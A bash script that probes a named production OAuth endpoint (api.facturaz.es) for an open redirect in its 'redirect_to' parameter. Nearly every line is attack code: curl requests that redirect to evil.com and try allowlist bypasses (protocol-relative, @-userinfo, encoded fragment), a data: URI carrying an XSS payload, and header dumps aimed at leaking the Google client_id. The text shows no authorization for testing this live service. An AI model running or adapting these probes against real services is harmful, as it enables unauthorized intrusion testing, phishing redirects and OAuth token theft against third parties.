#!/usr/bin/env bash
# Test open redirect via OAuth redirect_to parameter

UA="Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/124.0.0.0 Safari/537.36"

echo "================================"
echo " OPEN REDIRECT — FACTURAZ OAUTH"
echo "================================"

# Test 1: redirect_to=https://evil.com — does it redirect there?
echo ""
echo "[+] Test 1: redirect_to=https://evil.com (no follow)"
curl -sk -H "User-Agent: $UA" \
  "https://api.facturaz.es/auth/v1/authorize?provider=google&redirect_to=https://evil.com" \
  -D - -o /dev/null 2>/dev/null | grep -iE "location:|http/"

# Test 2: Follow redirects, see where we end up
echo ""
echo "[+] Test 2: Follow full redirect chain with redirect_to=https://evil.com"
curl -skL -H "User-Agent: $UA" \
  "https://api.facturaz.es/auth/v1/authorize?provider=google&redirect_to=https://evil.com" \
  -D - -o /dev/null -w "Final URL: %{url_effective}\n" 2>/dev/null | grep -iE "location:|final url"

# Test 3: redirect_to=https://evil.com on the callback directly
echo ""
echo "[+] Test 3: callback with redirect_to"
curl -sk -H "User-Agent: $UA" \
  "https://api.facturaz.es/auth/v1/callback?redirect_to=https://evil.com" \
  -D - -o - -w "\nHTTP: %{http_code}\n" 2>/dev/null | grep -iE "location:|http:|href=" | head -10

# Test 4: data: URI redirect full trace
echo ""
echo "[+] Test 4: redirect_to with data: URI — full trace"
curl -sk -H "User-Agent: $UA" \
  "https://api.facturaz.es/auth/v1/authorize?provider=google&redirect_to=data:text/html,<h1>XSS</h1>" \
  -D - -o - -w "\nFinal: %{url_effective}\n" 2>/dev/null | grep -iE "location:|http/|final:|redirect_to" | head -20

# Test 5: Supabase-specific redirect bypass — redirect_to with // prefix
echo ""
echo "[+] Test 5: Protocol-relative redirect bypass"
curl -sk -H "User-Agent: $UA" \
  "https://api.facturaz.es/auth/v1/authorize?provider=google&redirect_to=//evil.com" \
  -D - -o /dev/null -w "Final: %{url_effective}\n" 2>/dev/null | grep -iE "location:|final"

# Test 6: redirect_to with URL-encoded @ to bypass allowlist
echo ""
echo "[+] Test 6: redirect_to with @ bypass (https://facturaz.es@evil.com)"
curl -sk -H "User-Agent: $UA" \
  "https://api.facturaz.es/auth/v1/authorize?provider=google&redirect_to=https://facturaz.es@evil.com" \
  -D - -o /dev/null -w "Final: %{url_effective}\n" 2>/dev/null | grep -iE "location:|final"

# Test 7: URL with fragment
echo ""
echo "[+] Test 7: redirect_to with fragment bypass"
curl -sk -H "User-Agent: $UA" \
  "https://api.facturaz.es/auth/v1/authorize?provider=google&redirect_to=https://evil.com%23.facturaz.es" \
  -D - -o /dev/null -w "Final: %{url_effective}\n" 2>/dev/null | grep -iE "location:|final"

# Test 8: Check if /auth/v1/authorize leaks the Google client_id
echo ""
echo "[+] Test 8: Full authorize response headers"
curl -sk -H "User-Agent: $UA" \
  "https://api.facturaz.es/auth/v1/authorize?provider=google" \
  -D - -o /dev/null 2>/dev/null

echo ""
echo "[+] Done."
